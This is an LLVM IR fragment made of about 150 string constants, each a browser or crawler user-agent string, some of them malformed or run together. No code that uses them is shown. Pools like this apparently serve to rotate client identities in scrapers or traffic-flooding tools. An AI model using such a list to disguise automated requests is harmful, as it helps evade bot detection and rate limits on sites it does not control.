@.str.335 = private unnamed_addr constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00", align 1
@.str.336 = private unnamed_addr constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00", align 1
@.str.337 = private unnamed_addr constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00", align 1
@.str.338 = private unnamed_addr constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00", align 1
@.str.339 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00", align 1
@.str.340 = private unnamed_addr constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00", align 1
@.str.341 = private unnamed_addr constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00", align 1
@.str.342 = private unnamed_addr constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00", align 1
@.str.343 = private unnamed_addr constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00", align 1
@.str.344 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00", align 1
@.str.345 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00", align 1
@.str.346 = private unnamed_addr constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00", align 1
@.str.347 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.348 = private unnamed_addr constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00", align 1
@.str.349 = private unnamed_addr constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00", align 1
@.str.350 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00", align 1
@.str.351 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00", align 1
@.str.352 = private unnamed_addr constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00", align 1
@.str.353 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00", align 1
@.str.354 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00", align 1
@.str.355 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00", align 1
@.str.356 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00", align 1
@.str.357 = private unnamed_addr constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00", align 1
@.str.358 = private unnamed_addr constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00", align 1
@.str.359 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.360 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.361 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.362 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.363 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00", align 1
@.str.364 = private unnamed_addr constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00", align 1
@.str.365 = private unnamed_addr constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00", align 1
@.str.366 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00", align 1
@.str.367 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00", align 1
@.str.368 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.369 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.370 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00", align 1
@.str.371 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00", align 1
@.str.372 = private unnamed_addr constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00", align 1
@.str.373 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00", align 1
@.str.374 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00", align 1
@.str.375 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00", align 1
@.str.376 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00", align 1
@.str.377 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00", align 1
@.str.378 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.379 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00", align 1
@.str.380 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.381 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00", align 1
@.str.382 = private unnamed_addr constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.383 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00", align 1
@.str.384 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00", align 1
@.str.385 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00", align 1
@.str.386 = private unnamed_addr constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00", align 1
@.str.387 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.388 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.389 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.390 = private unnamed_addr constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.391 = private unnamed_addr constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.392 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.393 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.394 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.395 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.396 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.397 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.398 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.399 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.400 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.401 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.402 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.403 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.404 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.405 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.406 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.407 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.408 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.409 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.410 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.411 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.412 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.413 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.414 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.415 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.416 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.417 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.418 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.419 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.420 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.421 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.422 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.423 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.424 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.425 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.426 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.427 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.428 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.429 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.430 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.431 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.432 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.433 = private unnamed_addr constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00", align 1
@.str.434 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.435 = private unnamed_addr constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00", align 1
@.str.436 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.437 = private unnamed_addr constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00", align 1
@.str.438 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00", align 1
@.str.439 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.440 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00", align 1
@.str.441 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00", align 1
@.str.442 = private unnamed_addr constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00", align 1
@.str.443 = private unnamed_addr constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00", align 1
@.str.444 = private unnamed_addr constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00", align 1
@.str.445 = private unnamed_addr constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00", align 1
@.str.446 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00", align 1
@.str.447 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00", align 1
@.str.448 = private unnamed_addr constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00", align 1
@.str.449 = private unnamed_addr constant [19 x i8] c"C4PC UserAgent/0.7\00", align 1
@.str.450 = private unnamed_addr constant [19 x i8] c"Googlebot 1.01.003\00", align 1
@.str.451 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00", align 1
@.str.452 = private unnamed_addr constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00", align 1
@.str.453 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00", align 1
@.str.454 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.455 = private unnamed_addr constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.456 = private unnamed_addr constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00", align 1
@.str.457 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.458 = private unnamed_addr constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00", align 1
@.str.459 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.460 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00", align 1
@.str.461 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00", align 1
@.str.462 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00", align 1
@.str.463 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00", align 1
@.str.464 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00", align 1
@.str.465 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00", align 1
@.str.466 = private unnamed_addr constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00", align 1
@.str.467 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00", align 1
@.str.468 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00", align 1
@.str.469 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00", align 1
@.str.470 = private unnamed_addr constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00", align 1
@.str.471 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.472 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00", align 1
@.str.473 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00", align 1
@.str.474 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00", align 1
@.str.475 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00", align 1
@.str.476 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00", align 1
@.str.477 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00", align 1
@.str.478 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00", align 1
@.str.479 = private unnamed_addr constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00", align 1
@.str.480 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00", align 1
@.str.481 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00", align 1
@.str.482 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.483 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00", align 1
@.str.484 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00", align 1
@.str.485 = private unnamed_addr constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00", align 1
@.str.486 = private unnamed_addr constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00", align 1
@.str.487 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00", align 1
@.str.488 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
